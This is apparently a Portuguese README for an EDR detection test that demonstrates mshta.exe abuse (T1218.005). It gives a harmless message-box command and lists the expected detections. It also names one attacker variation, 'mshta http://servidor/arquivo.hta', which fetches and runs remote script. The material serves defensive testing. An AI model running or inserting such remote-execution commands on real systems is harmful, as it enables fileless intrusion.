# 11. Execucao via mshta (LOLBin)

[English](../en/11-execucao-mshta/README.md) | **Portugues**

**Tatica MITRE ATT&CK:** Defense Evasion e Execution
**ID:** T1218.005
**Severidade esperada:** Alta
**Precisa de admin:** Nao
**Destrutivo:** Nao

## Para que serve, na visao do atacante

O mshta.exe e um programa nativo do Windows feito para rodar aplicativos HTML, os arquivos com extensao .hta. O problema e que ele tambem executa scripts, em VBScript ou JScript, embutidos, inclusive direto de uma URL. O atacante usa o mshta para rodar codigo sem salvar um arquivo executavel no disco, o que dificulta a deteccao por assinatura.

## Por que e perigoso

E mais um LOLBin, uma ferramenta legitima usada para o mal. O codigo roda pela mao de um programa confiavel da Microsoft. Muitas vezes e usado logo no primeiro acesso, quando a vitima abre um anexo, e por ser sem arquivo, o chamado fileless, escapa de defesas que so olham arquivos gravados no disco.

## Analogia

E como usar o projetor da sala de reunioes, um equipamento comum e confiavel, para exibir instrucoes ao bando. Ninguem estranha o projetor ligado, e nada fica escrito no papel para ser encontrado depois.

## O que o script faz

Executa o mshta.exe com um script inofensivo embutido, que apenas exibe uma mensagem e fecha. Nenhum download real e feito. O objetivo e demonstrar o padrao do mshta executando script.

## Exemplo do comando

```cmd
mshta.exe vbscript:Execute("MsgBox ""Teste EDR - mshta"":close")
```

Variacao usada por atacantes, mshta http://servidor/arquivo.hta

## O que o EDR deve detectar

* O mshta.exe executando script, especialmente com vbscript ou uma URL.
* Padrao de System Binary Proxy Execution, T1218.005, severidade alta.

## Pre requisitos

* Nenhum privilegio especial.

## Limpeza

* Nada a limpar. O teste nao grava nada no disco.
